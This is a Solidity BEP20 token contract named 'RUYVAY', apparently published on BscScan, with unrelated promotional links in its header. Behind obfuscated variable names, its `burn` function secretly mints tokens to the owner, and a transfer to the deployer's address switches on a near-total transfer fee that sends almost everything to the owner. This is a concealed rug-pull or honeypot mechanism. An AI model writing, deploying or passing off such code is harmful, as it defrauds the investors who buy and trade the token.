/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20 14:15 GMT
 */
//Katara Culture Village
//https://www.katara.net/
//https://twitter.com/Reuters/status/1565132327268671489
//https://www.facebook.com/ali19sabry/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract NFZFAIT {
uint256 private  RMNKKB = 10000000000000;
uint256 private  ZUARKY = 1000000000000000;
uint256 private  VMIWMY = 100000000;
address private  WTDXNJ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 private  YWRTWD = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "RUYVAY";
address private  RPBETY = address(0);
uint256 private  UUYEDK = 1000000000000000000000;
address private  VANLYU = address(0);
uint256 private  UHGCOX = 1000000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "RUYVAY";
address private  JNMVIF = address(0);
uint256 public constant VDSKWK = 99999;
uint256 private  SAFXMS = 10000000000;
address private  ATQILT = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
function _getRPBETY() private returns (address) {
return RPBETY;
}

function _getRMNKKB() private returns (uint256) {
return RMNKKB;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getJNMVIF() private returns (address) {
return JNMVIF;
}

function _getSAFXMS() private returns (uint256) {
return SAFXMS;
}

function _getUUYEDK() private returns (uint256) {
return UUYEDK;
}

function _getZUARKY() private returns (uint256) {
return ZUARKY;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFAXXUA 0");
require(spender != address(0), "fFAXXUA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getVMIWMY() private returns (uint256) {
return VMIWMY;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FAXXUA");
require(to != address(0), "FAXXUA");
require(amount <= balanceOf[from], "FAXXUA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VDSKWK/YWRTWD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WTDXNJ){
YWRTWD = VDSKWK+2;
}
emit Transfer(from, to, transferAmount);
}
function _getATQILT() private returns (address) {
return ATQILT;
}

function _getVANLYU() private returns (address) {
return VANLYU;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getUHGCOX() private returns (uint256) {
return UHGCOX;
}

constructor () {
WTDXNJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}